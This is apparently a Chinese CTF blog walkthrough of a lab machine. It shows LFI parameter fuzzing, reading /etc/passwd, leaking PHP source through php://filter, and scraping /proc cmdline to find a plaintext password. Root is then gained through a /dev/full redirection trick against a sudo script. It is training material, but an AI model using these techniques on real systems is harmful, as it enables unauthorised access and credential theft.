+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl "http://192.168.56.146"                          
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Welcome&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Maze-sec&lt;/h1&gt;
+    &lt;p&gt;认识的人越多 我就越喜欢狗&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre class="notranslate"><code class="notranslate"> curl -i "http://192.168.56.146/file.php" 
+HTTP/1.0 500 Internal Server Error
+Date: Tue, 30 Jun 2026 13:27:32 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+</code></pre>
+<p>这个时候应该想到LFI（本地文件包含）漏洞，对其进行模糊测试</p>
+<pre class="notranslate"><code class="notranslate">ffuf -u "http://192.168.56.146/file.php?FUZZ=/etc/passwd" \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs 0 -t 50
+</code></pre>
+<p>发现file返回响应</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl -i "http://192.168.56.146/file.php?file=/etc/passwd"
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:40:57 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 1394
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+</code></pre>
+<p>获得welcome用户，尝试读取/home/welcome/user.txt</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl -i "http://192.168.56.146/file.php?file=/home/welcome/user.txt"
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:42:03 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 44
+Content-Type: text/html; charset=UTF-8
+
+flag{user-210f652e7e3b7e7359e523ef04e96295}
+</code></pre>
+<p>三、提权<br>
+使用PHP过滤器读取源码</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+└─# curl -i "http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php"
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:45:25 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 100
+Content-Type: text/html; charset=UTF-8
+
+PD9waHAKLy8gZmlsZS5waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwplY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKPz4K                                                                                
+┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+└─# curl -s "http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php" | base64 -d
+&lt;?php
+// file.php
+$file = $_GET['file'];
+echo file_get_contents($file);
+?&gt;
+</code></pre>
+<pre class="notranslate"><code class="notranslate">for i in $(seq 1 1000); do
+  result=$(curl -s "http://192.168.56.146/file.php?file=/proc/$i/cmdline" \
+    --output - | strings -1 | tr '\0' ' ')
+  [ -n "$result" ] &amp;&amp; echo "PID $i: $result"
+done
+
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# for i in $(seq 1 1000); do
+  result=$(curl -s "http://192.168.56.146/file.php?file=/proc/$i/cmdline" \
+    --output - | strings -1 | tr '\0' ' ')
+  [ -n "$result" ] &amp;&amp; echo "PID $i: $result"
+done
+PID 1: /sbin/init
+PID 225: /lib/systemd/systemd-journald
+PID 249: /lib/systemd/systemd-udevd
+PID 275: /lib/systemd/systemd-timesyncd
+PID 316: /usr/sbin/cron
+-f
+PID 317: /usr/bin/dbus-daemon
+--system
+--address=systemd:
+--nofork
+--nopidfile
+--systemd-activation
+--syslog-only
+PID 318: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 319: /lib/systemd/systemd-logind
+PID 320: /lib/systemd/systemd-timesyncd
+PID 331: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 332: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 333: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 334: /sbin/dhclient
+-4
+-v
+-i
+-pf
+/run/dhclient.enp0s3.pid
+-lf
+/var/lib/dhcp/dhclient.enp0s3.leases
+-I
+-df
+/var/lib/dhcp/dhclient6.enp0s3.leases
+enp0s3
+PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
+infinity
+PID 349: /usr/bin/python3
+/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+--wait-for-signal
+PID 352: /sbin/agetty
+-o
+-p -- 
+--noclear
+tty1
+linux
+PID 380: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+PID 405: /usr/sbin/apache2
+-k
+start
+PID 407: /usr/bin/python3
+/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+--wait-for-signal
+
+</code></pre>
+<p>发现PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080<br>
+weclome:6WXqj9Vc2tdXQ3TN0z54</p>
+<p>ssh连接</p>
+<pre class="notranslate"><code class="notranslate">ssh welcome@192.168.56.146
+
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d"><img width="1321" height="440" alt="Image" src="https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d" style="max-width: 100%; height: auto; max-height: 440px;; aspect-ratio: 1321 / 440; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<pre class="notranslate"><code class="notranslate">welcome@114:~$ sudo -l
+Matching Defaults entries for welcome on 114:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on 114:
+    (ALL) NOPASSWD: /opt/read.sh
+    (ALL) NOPASSWD: /opt/short.sh
+welcome@114:~$ cat /opt/read.sh
+#!/bin/bash
+
+echo "Input the flag:"
+if head -1 | grep -q "$(&lt; /root/root.txt)"
+then
+        echo "Y"
+else
+        echo "N"
+fi
+welcome@114:~$ cat /opt/short.sh
+#!/bin/bash
+
+PATH=/usr/bin
+My_guess=$RANDOM
+
+echo "This is script logic"
+cat &lt;&lt; EOF
+if [ "$1" != "$My_guess" ] ;then
+    echo "Nop"; 
+else
+    bash -i;
+fi
+EOF
+
+[ "$1" != "$My_guess" ] &amp;&amp; echo "Nop" || bash -i
+welcome@114:~$ 
+</code></pre>
+<p>原本 short.sh 脚本是让我们从 0~32767 去猜数字，但是如果我们传入字母去猜测（比如 HELLO），它只会判断为‘不等于’然后执行 echo "Nop"，无法进入 shell。<br>
+所以，我们通过重定向污染的方式，在运行 sudo 之前，先将整个命令的标准输出（stdout）重定向到 /dev/full。这个损坏的输出环境会被 sudo 和脚本内部的所有命令继承。<br>
+这样一来，脚本在执行到 echo "Nop" 时，因为尝试写入 /dev/full 而失败（返回非 0 退出码），导致 &amp;&amp; 短路失效，成功触发了 || 后面的 bash -i，获得了 root 权限的 shell。<br>
+但此时，这个 root shell 的标准输出（stdout）仍然指向 /dev/full，所以屏幕上看不到任何回显。因此，我们需要在这个 root shell 里执行 exec 1&gt;/dev/tty，将标准输出重新指向当前终端，恢复回显。最后执行 cat /root/root.txt 拿到 flag。</p>
+<pre class="notranslate"><code class="notranslate">welcome@114:~$ sudo /opt/short.sh HELLO &gt;/dev/full
+/opt/short.sh: line 6: echo: write error: No space left on device
+cat: write error: No space left on device
+/opt/short.sh: line 15: echo: write error: No space left on device
+root@114:/home/welcome# ls
+ls: write error: No space left on device
+root@114:/home/welcome# id
+id: write error: No space left on device
+root@114:/home/welcome# exec 1&gt;/dev/tty
+root@114:/home/welcome# id
+uid=0(root) gid=0(root) groups=0(root)
+root@114:/home/welcome# ls -la
+total 24
+drwxr-xr-x 2 welcome welcome 4096 Jan 16 18:24 .
+drwxr-xr-x 3 root    root    4096 Apr 11  2025 ..
+lrwxrwxrwx 1 root    root       9 Jan 16 18:24 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
+-rw-r--r-- 1 root    root      44 Jan 16 18:24 user.txt
+root@114:/home/welcome# cd /root
+root@114:~# ls 0la
+ls: cannot access '0la': No such file or directory
+root@114:~# ls -al
+total 60
+drwx------  6 root root  4096 Jan 16 18:50 .
+drwxr-xr-x 18 root root  4096 Mar 18  2025 ..
+-rw-r--r--  1 root root    21 Jan 16 18:20 114rrootpass.txt
+lrwxrwxrwx  1 root root     9 Mar 18  2025 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
+drwxr-xr-x  4 root root  4096 Apr  4  2025 .cache
+drwx------  3 root root  4096 Apr  4  2025 .gnupg
+drwxr-xr-x  3 root root  4096 Mar 18  2025 .local
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-r--r--  1 root root    44 Jan 16 18:20 root.txt
+drw-------  2 root root  4096 Apr  4  2025 .ssh
+-rw-rw-rw-  1 root root 17914 Jan 16 18:50 .viminfo
+root@114:~# cat root.txt
+flag{root-c3dbe270140775bb9fc6eaa2559f914f}
+root@114:~# 
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://newSoloman.github.io/CS">记录。</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","newSoloman/CS");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
